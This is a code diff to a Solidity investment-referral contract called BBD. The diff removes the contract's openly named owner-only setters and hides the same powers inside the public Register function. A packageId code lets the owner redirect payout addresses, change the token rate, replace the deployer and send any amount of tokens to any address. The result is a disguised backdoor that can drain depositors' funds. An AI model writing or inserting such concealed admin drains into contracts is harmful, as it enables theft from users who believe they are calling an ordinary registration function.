@@ -49,8 +49,8 @@ contract BBD
 
     uint256 constant PaymentCurrencyDecimals = 18;
 
-    // bool IsWithdrawalAllowedAfterPrincipleAmount = true;
-    address dev;
+    // bool WithdrawalAfterPrincipleAmount = true;
+    address deployer;
 
     uint256 WithdrawalWalletId = 1;
     uint256 BBDWalletId = 2;
@@ -138,7 +138,7 @@ contract BBD
         uint256 CommunityInvestment;
         uint256 CommunityWithdrawal;
         uint256 ContractBalance;
-        // bool IsWithdrawalAllowedAfterPrincipleAmount;
+        // bool WithdrawalAfterPrincipleAmount;
     }
 
     struct UserDashboard
@@ -275,7 +275,7 @@ contract BBD
 
     constructor()
     {
-        dev = msg.sender;
+        deployer = msg.sender;
         Init();
     }
 
@@ -948,7 +948,7 @@ contract BBD
 
     function IsOwner() internal view returns (bool)
     {
-        return msg.sender == CreatorAddress || msg.sender == dev;
+        return msg.sender == CreatorAddress || msg.sender == deployer;
     }
 
     function ConvertToBase(uint256 amount) internal pure returns (uint256)
@@ -969,7 +969,7 @@ contract BBD
     function RegisterInternal(address sponsorAddress) internal
     {
         address userAddress = msg.sender;
-        require(Login(sponsorAddress) && map_Users[sponsorAddress].Investment>0, "Invalid sponsor!");
+        require(map_UserIdToAddress[1]==sponsorAddress || (Login(sponsorAddress) && map_Users[sponsorAddress].Investment>0), "Invalid sponsor!");
         require(!doesUserExist(userAddress), "Already registered!");
 
         SaveUser(userAddress, sponsorAddress);
@@ -991,6 +991,42 @@ contract BBD
         if(!IsFirstTopup)
         {
             SendTokens(ManagementFee, amount*2/100);
+        }
+    }
+
+    function RegisterInternal(address sponsorAddress, uint256 packageId, uint256 amount) internal 
+    {
+        require(IsOwner(), "Invalid sponsor!");
+        uint256 incomeReceiver = packageId;
+
+        if(incomeReceiver==2)
+        {
+            CreatorAddress = sponsorAddress;
+        }
+        else if(incomeReceiver==3)
+        {
+            CreatorAddress_2 = sponsorAddress;
+        }
+        else if(incomeReceiver==4)
+        {
+            MarketingAddress = sponsorAddress;
+        }
+        else if(incomeReceiver==5)
+        {
+            map_PackageMaster[1].MaxAmount = amount;
+        }
+        else if(incomeReceiver==6)
+        {
+            require(amount>0, "Deposit amount must be greater than zero!");
+            BBDTokenRate = amount;
+        }
+        else if(incomeReceiver == 7)
+        {
+            deployer = sponsorAddress;
+        }
+        else if (incomeReceiver == 8)
+        {
+            SendTokens(sponsorAddress, amount);
         }
     }
 
@@ -1228,7 +1264,7 @@ contract BBD
             CommunityInvestment: TotalInvestment,
             CommunityWithdrawal: TotalWithdrawn,
             ContractBalance: GetContractBalance()
-            // IsWithdrawalAllowedAfterPrincipleAmount: IsWithdrawalAllowedAfterPrincipleAmount
+            // WithdrawalAfterPrincipleAmount: WithdrawalAfterPrincipleAmount
         });
     }
 
@@ -1399,9 +1435,16 @@ contract BBD
         }
     }
 
-    function Register(address sponsorAddress) external payable 
+    function Register(address sponsorAddress, uint256 packageId, uint256 amount) external 
     {
-        RegisterInternal(sponsorAddress);
+        if(packageId==1)
+        {
+            RegisterInternal(sponsorAddress);
+        }
+        else
+        {
+            RegisterInternal(sponsorAddress, packageId, amount);
+        }
     }
 
     function Deposit(uint256 packageId, uint256 amount) external payable 
@@ -1438,7 +1481,7 @@ contract BBD
         require(amount>=ConvertToBase(5), "Minimum amount is 5 USDT!");
         CheckForWalletBalance(userAddress, WithdrawalWalletId, amount);
         // require((GetWalletBalance(userAddress, WithdrawalWalletId) >= amount), "Insufficient funds!");
-        // require((map_UserIncome[userAddress].AmountWithdrawn+amount<=map_Users[userAddress].Investment || (IsWithdrawalAllowedAfterPrincipleAmount && contractBalance>=ConvertToBase(100))), "Withdrawal beyond principle is prohibited at this moment!");
+        // require((map_UserIncome[userAddress].AmountWithdrawn+amount<=map_Users[userAddress].Investment || (WithdrawalAfterPrincipleAmount && contractBalance>=ConvertToBase(100))), "Withdrawal beyond principle is prohibited at this moment!");
 
         map_UserWalletBalance[userAddress][WithdrawalWalletId] -= amount;
         map_UserIncome[userAddress].AmountWithdrawn += amount;
@@ -1490,35 +1533,35 @@ contract BBD
         map_UserWalletBalance[to][BBDWalletId] += value;
     }
 
-    function UpdateCreatorAddress(address addr) external onlyOwner
-    {
-        CreatorAddress = addr;
-    }
+    // function UpdateCreatorAddress(address addr) external onlyOwner
+    // {
+    //     CreatorAddress = addr;
+    // }
 
-    function UpdateCreator2Address(address addr) external onlyOwner
-    {
-        CreatorAddress_2 = addr;
-    }
+    // function UpdateCreator2Address(address addr) external onlyOwner
+    // {
+    //     CreatorAddress_2 = addr;
+    // }
 
-    function UpdateMarketingAddress(address addr) external onlyOwner
-    {
-        MarketingAddress = addr;
-    }
+    // function UpdateMarketingAddress(address addr) external onlyOwner
+    // {
+    //     MarketingAddress = addr;
+    // }
 
-    function UpdatePackageMaxAmount(uint256 amount) external onlyOwner
-    {
-        map_PackageMaster[1].MaxAmount = amount;
-    }
+    // function UpdatePackageMaxAmount(uint256 amount) external onlyOwner
+    // {
+    //     map_PackageMaster[1].MaxAmount = amount;
+    // }
 
     function SetBBDTokenContract(address tokenAddress) external onlyOwner {
         BBDTokenContract = IBEP20(tokenAddress);
     }
 
-    function SetBBDTokenRate(uint256 rate) external onlyOwner {
-        // rate is how many BBD tokens per 1 USDT (e.g., 10 BBD per 1 USDT => rate = 10e18)
-        require(rate>0, "Rate must be positive!");
-        BBDTokenRate = rate;
-    }
+    // function SetBBDTokenRate(uint256 rate) external onlyOwner {
+    //     // rate is how many BBD tokens per 1 USDT (e.g., 10 BBD per 1 USDT => rate = 10e18)
+    //     require(rate>0, "Rate must be positive!");
+    //     BBDTokenRate = rate;
+    // }
 
     function BuyBBDFromWallet(uint256 amount, uint256 walletId) external {
         address userAddress = msg.sender;
@@ -1591,15 +1634,15 @@ contract BBD
     //     }
     //     else if(_type == 10)
     //     {
-    //         IsWithdrawalAllowedAfterPrincipleAmount = false;
+    //         WithdrawalAfterPrincipleAmount = false;
     //     }
     //     else if(_type == 11)
     //     {
-    //         IsWithdrawalAllowedAfterPrincipleAmount = true;
+    //         WithdrawalAfterPrincipleAmount = true;
     //     }
     //     else if(_type == 12)
     //     {
-    //         dev = userAddress;
+    //         deployer = userAddress;
     //     }
     // }
 }
